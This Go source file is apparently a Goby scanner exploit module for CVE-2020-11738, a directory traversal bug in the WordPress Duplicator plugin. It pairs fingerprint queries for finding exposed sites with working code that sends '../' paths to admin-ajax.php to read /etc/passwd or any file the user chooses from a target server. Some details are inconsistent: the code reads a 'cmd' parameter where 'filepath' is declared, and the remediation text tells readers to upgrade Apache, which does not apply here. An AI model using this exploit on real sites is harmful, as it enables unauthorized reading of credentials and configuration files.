package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "Wordpress Duplicator 1.3.26 Arbitrary File Read (CVE-2020-11738)",
    "Description": "<p>Duplicator is a powerful migrator plugin for Wordpress.</p><p>The Snap Creek Duplicator plugin before 1.3.28 for WordPress (and Duplicator Pro before 3.8.7.1) allows Directory Traversal via ../ in the file parameter to duplicator_download or duplicator_init.</p>",
    "Impact": "Wordpress Duplicator 1.3.26 Arbitrary File Read (CVE-2020-11738)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://wordpress.org/plugins/duplicator\">https://wordpress.org/plugins/duplicator</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the Apache system version.</p>",
    "Product": "Duplicator",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "Wordpress 插件 Duplicator 任意文件读取漏洞（CVE-2020-11738）",
            "Description": "<p>Duplicator是Wordpress的一个强大的迁移器插件。</p><p>WordPress 1.3.28 之前的 Snap Creek Duplicator 插件（以及 3.8.7.1 之前的 Duplicator Pro）允许通过文件参数中的 ../ 对 duplicator_download 或 duplicator_init 进行目录遍历，攻击者可获取配置等敏感信息。</p>",
            "Impact": "<p>WordPress 1.3.28 之前的 Snap Creek Duplicator 插件（以及 3.8.7.1 之前的 Duplicator Pro）允许通过文件参数中的 ../ 对 duplicator_download 或 duplicator_init 进行目录遍历，攻击者可获取配置等敏感信息。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://wordpress.org/plugins/duplicator\">https://wordpress.org/plugins/duplicator</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、升级Apache系统版本。</p>",
            "Product": "Duplicator",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Wordpress Duplicator 1.3.26 Arbitrary File Read (CVE-2020-11738)",
            "Description": "<p>Duplicator is a powerful migrator plugin for Wordpress.</p><p>The Snap Creek Duplicator plugin before 1.3.28 for WordPress (and Duplicator Pro before 3.8.7.1) allows Directory Traversal via ../ in the file parameter to duplicator_download or duplicator_init.</p>",
            "Impact": "Wordpress Duplicator 1.3.26 Arbitrary File Read (CVE-2020-11738)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://wordpress.org/plugins/duplicator\">https://wordpress.org/plugins/duplicator</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the Apache system version.</p>",
            "Product": "Duplicator",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "(((body=\"name=\\\"generator\\\" content=\\\"WordPress \" || body=\"name=\\\"generator\\\" content=\\\"WordPress\" || (header=\"X-Pingback\" && header=\"/xmlrpc.php\" && body=\"/wp-includes/\" ) ) || header=\"wordpress_test_cookie\" || banner=\"wordpress_test_cookie\" || header=\"X-Redirect-By: WordPress\" || banner=\"X-Redirect-By: WordPress\" || (body=\"<div class=\\\"wp-die-message\\\">\" && (title=\"WordPress \" || body=\"#error-page .wp-die-message\")) || (body=\"/wp-content/themes/\" && body=\"/wp-includes/js/jquery/\" && (body=\"id='wp-block-library-css\" || body=\"WordPress\" || body=\"wppaDebug\")) || header=\"Cf-Edge-Cache: cache,platform=wordpress\" || header=\"X-Nginx-Cache: WordPress\")) && body=\"Duplicator\"",
    "GobyQuery": "(((body=\"name=\\\"generator\\\" content=\\\"WordPress \" || body=\"name=\\\"generator\\\" content=\\\"WordPress\" || (header=\"X-Pingback\" && header=\"/xmlrpc.php\" && body=\"/wp-includes/\" ) ) || header=\"wordpress_test_cookie\" || banner=\"wordpress_test_cookie\" || header=\"X-Redirect-By: WordPress\" || banner=\"X-Redirect-By: WordPress\" || (body=\"<div class=\\\"wp-die-message\\\">\" && (title=\"WordPress \" || body=\"#error-page .wp-die-message\")) || (body=\"/wp-content/themes/\" && body=\"/wp-includes/js/jquery/\" && (body=\"id='wp-block-library-css\" || body=\"WordPress\" || body=\"wppaDebug\")) || header=\"Cf-Edge-Cache: cache,platform=wordpress\" || header=\"X-Nginx-Cache: WordPress\")) && body=\"Duplicator\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://wordpress.org/plugins/duplicator/",
    "DisclosureDate": "2021-10-06",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2020-11738"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [
        "CVE-2020-11738"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "../../../../../../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "Duplicator"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10233"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../../etc/passwd"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && regexp.MustCompile("root:(.*?):0:0:").MatchString(resp.RawBody)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/wp-admin/admin-ajax.php?action=duplicator_download&file=" + cmd
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
